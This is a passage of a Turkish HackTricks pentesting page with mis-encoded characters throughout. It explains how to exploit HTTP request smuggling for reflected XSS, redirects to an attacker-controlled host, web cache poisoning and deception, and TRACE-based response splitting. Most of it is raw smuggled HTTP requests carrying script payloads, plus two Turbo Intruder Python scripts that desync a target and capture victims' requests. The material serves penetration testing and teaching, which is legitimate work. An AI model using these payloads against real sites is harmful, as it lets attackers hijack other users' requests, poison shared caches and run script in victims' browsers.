### YansÄ±tÄ±lan XSS'i sÃ¶mÃ¼rmek iÃ§in HTTP isteÄŸi kaÃ§Ä±rma kullanÄ±mÄ±

HTTP Ä°stek KaÃ§Ä±rma, web sayfalarÄ±nÄ± **YansÄ±tÄ±lan XSS**'e karÅŸÄ± savunmasÄ±z hale getiren siteleri sÃ¶mÃ¼rmek iÃ§in kullanÄ±labilir ve Ã¶nemli avantajlar sunar:

* Hedef kullanÄ±cÄ±larla etkileÅŸim **gerektirmez**.
* Genellikle ulaÅŸÄ±lamayan istek bÃ¶lÃ¼mlerindeki XSS'in sÃ¶mÃ¼rÃ¼lmesine **izin verir**, Ã¶rneÄŸin HTTP istek baÅŸlÄ±klarÄ±.

KullanÄ±cÄ±-AjanÄ± baÅŸlÄ±ÄŸÄ± aracÄ±lÄ±ÄŸÄ±yla YansÄ±tÄ±lan XSS'e duyarlÄ± bir web sitesinin bulunduÄŸu senaryolarda, aÅŸaÄŸÄ±daki yÃ¼k, bu zafiyetin nasÄ±l sÃ¶mÃ¼rÃ¼leceÄŸini gÃ¶stermektedir:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Bu yÃ¼k, zafiyeti sÃ¶mÃ¼rmek iÃ§in yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r:

1. `Transfer-Encoding: chunked` baÅŸlÄ±ÄŸÄ±yla, kaÃ§akÃ§Ä±lÄ±ÄŸÄ±n baÅŸlangÄ±cÄ±nÄ± belirtmek iÃ§in gÃ¶rÃ¼nÃ¼ÅŸte tipik bir `POST` isteÄŸi baÅŸlatma.
2. Chunked mesaj gÃ¶vdesinin sonunu belirten `0` ile devam etme.
3. ArdÄ±ndan, kaÃ§akÃ§Ä±lÄ±k yapÄ±lmÄ±ÅŸ bir `GET` isteÄŸi tanÄ±tÄ±lÄ±r, burada `User-Agent` baÅŸlÄ±ÄŸÄ±na `<script>alert(1)</script>` betiÄŸi enjekte edilir ve sunucu bu sonraki isteÄŸi iÅŸlediÄŸinde XSS tetiklenir.

KaÃ§akÃ§Ä±lÄ±k yoluyla `User-Agent`i manipÃ¼le ederek, yÃ¼k normal istek kÄ±sÄ±tlamalarÄ±nÄ± atlayarak, Reflected XSS zafiyetini standart olmayan ancak etkili bir ÅŸekilde sÃ¶mÃ¼rÃ¼r.

### HTTP Ä°steÄŸi KaÃ§akÃ§Ä±lÄ±ÄŸÄ± ile Site Ä°Ã§i YÃ¶nlendirmelerin SÃ¶mÃ¼rÃ¼lmesi <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Uygulamalar genellikle, yÃ¶nlendirme URL'sindeki `Host` baÅŸlÄ±ÄŸÄ±ndan gelen ana bilgisayar adÄ±nÄ± kullanarak bir URL'den baÅŸka bir URL'ye yÃ¶nlendirme yapar. Bu, Apache ve IIS gibi web sunucularÄ±nda yaygÄ±ndÄ±r. Ã–rneÄŸin, bir kesme iÅŸareti olmadan bir klasÃ¶r istemek, bir kesme iÅŸaretini iÃ§erecek ÅŸekilde yÃ¶nlendirmeye neden olur:
```
GET /home HTTP/1.1
Host: normal-website.com
```
SonuÃ§lar:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Bu davranÄ±ÅŸ, HTTP isteÄŸi kaÃ§Ä±rma kullanÄ±larak kullanÄ±cÄ±larÄ±n harici bir siteye yÃ¶nlendirilmesi iÃ§in manipÃ¼le edilebilir. Ã–rneÄŸin:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Bu kaÃ§ak istek, iÅŸlenen sonraki kullanÄ±cÄ± isteÄŸinin bir saldÄ±rgan tarafÄ±ndan kontrol edilen bir web sitesine yÃ¶nlendirilmesine neden olabilir:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
SonuÃ§lar:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
### HTTP Ä°steÄŸi KaÃ§Ä±rma Yoluyla Web Ã–nbellek Zehirlenmesini SÃ¶mÃ¼rme <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web Ã¶nbellek zehirlenmesi, genellikle performansÄ± artÄ±rmak amacÄ±yla iÃ§eriÄŸi Ã¶nbelleÄŸe alan **Ã¶n uÃ§ altyapÄ±sÄ±nÄ±n herhangi bir bileÅŸeni** tarafÄ±ndan gerÃ§ekleÅŸtirilebilir. Sunucunun yanÄ±tÄ±nÄ± manipÃ¼le ederek, **Ã¶nbelleÄŸi zehirlemek** mÃ¼mkÃ¼ndÃ¼r.

Daha Ã¶nce, sunucu yanÄ±tlarÄ±nÄ±n nasÄ±l deÄŸiÅŸtirilebileceÄŸini ve 404 hatasÄ± dÃ¶ndÃ¼rÃ¼lebileceÄŸini gÃ¶zlemledik (bkz. [Temel Ã–rnekler](./#basic-examples)). Benzer ÅŸekilde, sunucuyu, `/static/include.js` isteÄŸi iÃ§in `/index.html` iÃ§eriÄŸini sunacak ÅŸekilde kandÄ±rmak mÃ¼mkÃ¼ndÃ¼r. SonuÃ§ olarak, `/static/include.js` iÃ§eriÄŸi, Ã¶nbellekteki `/index.html` iÃ§eriÄŸi ile deÄŸiÅŸtirilir ve kullanÄ±cÄ±lara eriÅŸilemez hale gelir, bu da Hizmet Reddi (DoS) saldÄ±rÄ±sÄ±na neden olabilir.

Bu teknik, **AÃ§Ä±k YÃ¶nlendirme aÃ§Ä±ÄŸÄ±** keÅŸfedilirse veya **aÃ§Ä±k yÃ¶nlendirmeye yÃ¶nlendirme** varsa Ã¶zellikle etkili hale gelir. Bu tÃ¼r zafiyetler, `/static/include.js` Ã¶nbelleÄŸinin iÃ§eriÄŸini, saldÄ±rganÄ±n kontrolÃ¼ndeki bir betikle deÄŸiÅŸtirmek iÃ§in sÃ¶mÃ¼rÃ¼lebilir ve temelde gÃ¼ncellenmiÅŸ `/static/include.js` isteyen tÃ¼m istemcilere karÅŸÄ± yaygÄ±n bir Ã‡apraz Site Betikleme (XSS) saldÄ±rÄ±sÄ±nÄ± etkinleÅŸtirir.

AÅŸaÄŸÄ±da, **Ã¶nbellek zehirlenmesinin aÃ§Ä±k yÃ¶nlendirmeye yÃ¶nlendirme ile birleÅŸtirilmesinin** nasÄ±l sÃ¶mÃ¼rÃ¼ldÃ¼ÄŸÃ¼nÃ¼n bir Ã¶rneÄŸi bulunmaktadÄ±r. AmaÃ§, `/static/include.js` Ã¶nbellek iÃ§eriÄŸini saldÄ±rganÄ±n kontrol ettiÄŸi JavaScript kodunu sunacak ÅŸekilde deÄŸiÅŸtirmektir:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Not edilen `/post/next?postId=3` hedef alan gÃ¶mÃ¼lÃ¼ isteÄŸi dikkate alÄ±n. Bu istek, alanÄ± belirlemek iÃ§in **Ana bilgisayar baÅŸlÄ±k deÄŸerini** kullanarak `/post?postId=4`'e yÃ¶nlendirilecektir. **Ana bilgisayar baÅŸlÄ±ÄŸÄ±nÄ±** deÄŸiÅŸtirerek, saldÄ±rgan isteÄŸi kendi alanlarÄ±na yÃ¶nlendirebilir (**yerinde yÃ¶nlendirme aÃ§Ä±k yÃ¶nlendirmeye**).

BaÅŸarÄ±lÄ± **soket zehirlenmesi** sonrasÄ±nda `/static/include.js` iÃ§in bir **GET isteÄŸi** baÅŸlatÄ±lmalÄ±dÄ±r. Bu istek, Ã¶nceki **yerinde yÃ¶nlendirme aÃ§Ä±k yÃ¶nlendirmeye** isteÄŸi tarafÄ±ndan kirletilecek ve saldÄ±rgan tarafÄ±ndan kontrol edilen betiÄŸin iÃ§eriÄŸini getirecektir.

ArdÄ±ndan, `/static/include.js` iÃ§in yapÄ±lan herhangi bir istek, saldÄ±rganÄ±n betiÄŸinin Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ iÃ§eriÄŸini sunacak ve etkili bir XSS saldÄ±rÄ±sÄ± baÅŸlatacaktÄ±r.

### Web Ã¶nbellek aldatmacasÄ± gerÃ§ekleÅŸtirmek iÃ§in HTTP isteÄŸi kaÃ§Ä±rma kullanÄ±mÄ± <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Web Ã¶nbellek zehirlenmesi ile web Ã¶nbellek aldatmacasÄ± arasÄ±ndaki fark nedir?**
>
> * **Web Ã¶nbellek zehirlenmesinde**, saldÄ±rgan uygulamanÄ±n Ã¶nbelleÄŸe bazÄ± kÃ¶tÃ¼ amaÃ§lÄ± iÃ§erikler depolamasÄ±na neden olur ve bu iÃ§erik Ã¶nbellekten diÄŸer uygulama kullanÄ±cÄ±larÄ±na sunulur.
> * **Web Ã¶nbellek aldatmacasÄ±nda**, saldÄ±rgan uygulamayÄ± baÅŸka bir kullanÄ±cÄ±ya ait hassas iÃ§erikleri Ã¶nbelleÄŸe almasÄ±na neden olur ve ardÄ±ndan bu iÃ§eriÄŸi Ã¶nbellekten alÄ±r.

SaldÄ±rgan, hassas kullanÄ±cÄ±ya Ã¶zgÃ¼ iÃ§eriÄŸi getiren kaÃ§ak bir istek oluÅŸturur. AÅŸaÄŸÄ±daki Ã¶rneÄŸi gÃ¶z Ã¶nÃ¼nde bulundurun:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
EÄŸer bu kaÃ§ak istek, Ã¶nbellekte saklanan statik iÃ§erik iÃ§in tasarlanmÄ±ÅŸ bir Ã¶nbellek girdisini zehirlerse (Ã¶rneÄŸin, `/someimage.png`), kurbanÄ±n hassas verileri `/private/messages` dizinindeki statik iÃ§eriÄŸin Ã¶nbellek girdisi altÄ±nda Ã¶nbelleÄŸe alÄ±nabilir. SonuÃ§ olarak, saldÄ±rgan bu Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ hassas verileri kurtarabilir.

### HTTP Ä°steÄŸi KaÃ§Ä±rarak TRACE YÃ¶ntemini KÃ¶tÃ¼ye Kullanma <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**Bu yazÄ±da**](https://portswigger.net/research/trace-desync-attack) sunulduÄŸu gibi, sunucunun TRACE yÃ¶nteminin etkinleÅŸtirilmiÅŸ olmasÄ± durumunda, bu yÃ¶ntemi bir HTTP Ä°steÄŸi KaÃ§Ä±rarak kÃ¶tÃ¼ye kullanmak mÃ¼mkÃ¼n olabilir. Bu, Ã§Ã¼nkÃ¼ bu yÃ¶ntem, sunucuya gÃ¶nderilen herhangi bir baÅŸlÄ±ÄŸÄ± yanÄ±tÄ±n gÃ¶vdesinin bir parÃ§asÄ± olarak yansÄ±tacaktÄ±r. Ã–rneÄŸin:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Cevap gibi bir yanÄ±t gÃ¶nderecektir:
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Bu davranÄ±ÅŸÄ± istismar etmenin bir Ã¶rneÄŸi, **Ã¶nce bir HEAD isteÄŸi gÃ¶ndermek** olabilir. Bu istek, yalnÄ±zca bir GET isteÄŸinin **baÅŸlÄ±klarÄ±** ile yanÄ±tlanacaktÄ±r (**`Content-Type`** dahil). Ve hemen ardÄ±ndan bir **TRACE isteÄŸi gÃ¶ndermek**, gÃ¶nderilen veriyi **yansÄ±tacaktÄ±r**.\
HEAD yanÄ±tÄ± bir `Content-Length` baÅŸlÄ±ÄŸÄ± iÃ§ereceÄŸinden, **TRACE isteÄŸinin yanÄ±tÄ±, HEAD yanÄ±tÄ±nÄ±n gÃ¶vdesi olarak iÅŸleme alÄ±nacak ve bu nedenle yanÄ±tta keyfi veriler yansÄ±tÄ±lacaktÄ±r**. \
Bu yanÄ±t bir sonraki isteÄŸe baÄŸlantÄ± Ã¼zerinden gÃ¶nderileceÄŸinden, bu Ã¶rneÄŸin, keyfi JS kodu enjekte etmek iÃ§in kullanÄ±labileceÄŸi **Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ bir JS dosyasÄ±nda kullanÄ±labilir**.

### HTTP YanÄ±t BÃ¶lÃ¼nmesi AracÄ±lÄ±ÄŸÄ±yla TRACE'nin KÃ¶tÃ¼ye KullanÄ±mÄ± <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**Bu yazÄ±yÄ±**](https://portswigger.net/research/trace-desync-attack) takip etmeye devam etmek, TRACE yÃ¶ntemini kÃ¶tÃ¼ye kullanmanÄ±n baÅŸka bir yolunu Ã¶nermektedir. Yorumlarda belirtildiÄŸi gibi, bir HEAD isteÄŸi ve bir TRACE isteÄŸi gÃ¶ndererek, HEAD isteÄŸine verilen yanÄ±tta **bazÄ± yansÄ±tÄ±lan verileri kontrol etmek mÃ¼mkÃ¼ndÃ¼r**. HEAD isteÄŸinin gÃ¶vdesinin uzunluÄŸu temelde Content-Length baÅŸlÄ±ÄŸÄ±nda belirtilir ve TRACE isteÄŸine verilen yanÄ±t tarafÄ±ndan oluÅŸturulur.

Bu nedenle, yeni fikir ÅŸudur: Bu Content-Length ve TRACE yanÄ±tÄ±nda verilen verileri bilerek, TRACE yanÄ±tÄ±nÄ±n, Content-Length'in son baytÄ±ndan sonra geÃ§erli bir HTTP yanÄ±tÄ± iÃ§ermesini saÄŸlamak mÃ¼mkÃ¼ndÃ¼r, bu da bir saldÄ±rganÄ±n bir sonraki yanÄ±tÄ± tamamen kontrol etmesine olanak tanÄ±r (bu, Ã¶nbellek zehirlenmesi gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±labilir).

Ã–rnek:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Bu yanÄ±tlarÄ± oluÅŸturacak (HEAD yanÄ±tÄ±nÄ±n bir Content-Length'e sahip olduÄŸuna dikkat edin, bu da TRACE yanÄ±tÄ±nÄ±n HEAD gÃ¶vdesinin bir parÃ§asÄ± haline gelmesini saÄŸlar ve HEAD Content-Length bittiÄŸinde geÃ§erli bir HTTP yanÄ±tÄ± gizlenir):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(â€œarbitrary responseâ€)</script>
```
### HTTP Ä°stek Smuggling'i HTTP YanÄ±tÄ± Desenkronizasyonu ile SilahlandÄ±rma

Bir HTTP Ä°stek Smuggling aÃ§Ä±ÄŸÄ± buldunuz ve nasÄ±l sÃ¶mÃ¼rÃ¼leceÄŸini bilmiyorsanÄ±z, bu baÅŸka bir sÃ¶mÃ¼rÃ¼ yÃ¶ntemini deneyin:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### DiÄŸer HTTP Ä°stek Smuggling Teknikleri

* TarayÄ±cÄ± HTTP Ä°stek Smuggling'i (Ä°stemci TarafÄ±)

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* HTTP/2 DÃ¼ÅŸÃ¼rmelerinde Ä°stek Smuggling'i

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## Turbo intruder betikleri

### CL.TE

[https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Kaynak: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## AraÃ§lar

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Bu araÃ§, tuhaf istek smugling farklÄ±lÄ±klarÄ±nÄ± bulmak iÃ§in kullanÄ±ÅŸlÄ± olan bir dil tabanlÄ± HTTP Fuzzer'dÄ±r.

## Referanslar

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking hilelerinizi paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
